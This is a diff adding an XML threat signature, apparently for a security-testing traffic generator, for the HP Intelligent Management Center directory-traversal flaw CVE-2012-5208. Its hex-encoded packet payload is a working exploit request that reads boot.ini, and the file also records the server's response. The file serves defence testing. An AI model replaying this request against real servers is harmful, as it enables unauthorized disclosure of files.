@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP Intelligent Management Center DownloadServlet Information Disclosure"/>
+    <EngDesc display="true" value="An information disclosure vulnerability exists in HP Intelligent Management Center. The vulnerability is due to lack&#13;&#10;of authentication and insufficient input validation in the DownloadServlet servlet when processing HTTP request&#13;&#10;parameters.&#13;&#10;By  sending  crafted  HTTP  requests  to  the  target  system,  a  remote  unauthenticated  attacker  can  leverage  this&#13;&#10;vulnerability to view the contents of arbitrary files on a target system."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HP_Intelligent_Management_Center"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="v5.1_E0202_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20130409-24"/>
+    <CVEID display="true" value="CVE-2012-5208"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="91033"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="cff5e206fe8a5c8363a6d2ab2ac2213d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="none"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635058522940290642"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1386671416" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0D:64" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0108" Identification="1740" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="C0B7" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="39675" destPort="$HTTPdestPort" SeqNumber="9EABC660" AckNumber="989C9C78" HeaderLength="08" WindowSize="002E" Checksum="106D" UrgentPointer="0000" Options="0101080A3A44D16300000000" Payload="474554202F696D632F746D702F646F776E6C6F61643F66696C654E616D653D2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F626F6F742E696E6920485454502F312E310D0A486F73743A20646863703231343A383038300D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6F6B69653A204A53455353494F4E49443D43434343434343434343434343434343434343434343434343434343434343430D0A0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0D:64" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0229" Identification="7148" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="258E" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="39675" SeqNumber="989C9C78" AckNumber="9EABC734" HeaderLength="08" WindowSize="FF2B" Checksum="4EF8" UrgentPointer="0000" Options="0101080A0218FEC63A44D163" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204A53455353494F4E49443D43414530353946463337453531334334313835304545304637333933363245423B20506174683D2F696D630D0A436F6E74656E742D646973706F736974696F6E3A206174746163686D656E743B2066696C656E616D653D2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F626F6F742E696E690D0A436F6E74656E742D547970653A206170706C69636174696F6E2F646F630D0A5472616E736665722D456E636F64696E673A206368756E6B65640D0A446174653A204D6F6E2C203036204D617920323031332031343A33303A333920474D540D0A0D0A64340D0A5B626F6F74206C6F616465725D200D0A74696D656F75743D3330200D0A64656661756C743D6D756C74692830296469736B283029726469736B283029706172746974696F6E2831295C57494E444F5753200D0A5B6F7065726174696E672073797374656D735D200D0A6D756C74692830296469736B283029726469736B283029706172746974696F6E2831295C57494E444F57533D2257696E646F77732053657276657220323030332C20456E746572707269736522202F66617374646574656374202F4E6F457865637574653D4F70744F75740D0A300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
